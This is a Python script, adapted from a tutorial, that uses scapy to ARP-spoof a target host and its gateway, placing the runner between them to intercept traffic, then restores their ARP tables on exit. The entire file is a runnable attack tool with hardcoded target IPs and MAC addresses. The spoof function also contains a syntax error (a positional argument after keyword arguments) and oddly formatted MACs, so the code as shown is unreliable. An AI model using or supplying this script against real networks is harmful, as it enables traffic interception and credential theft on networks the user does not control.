import scapy.all as scapy
import time


# https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/
#https://scapy.readthedocs.io/en/latest/api/scapy.layers.l2.html#scapy.layers.l2.ARP
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[1]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, "00-90-4F-E4-E9-2D",
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    #hwdst=get_mac(target_ip)

def restore(destination_ip, source_ip):
    destination_mac = "00-90-4F-E4-E9-2D" 
    source_mac = "7C-57-58-38-E4-94"
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)
    #destination_mac = get_mac(destination_ip)
    #source_mac = get_mac(source_ip)

target_ip = "10.0.2.5"  # Enter your target IP
gateway_ip = "10.0.2.1"  # Enter your gateway's IP

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent " + str(sent_packets_count), end="")
        time.sleep(1)  # Waits for one second

except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print("[+] Arp Spoof Stopped")
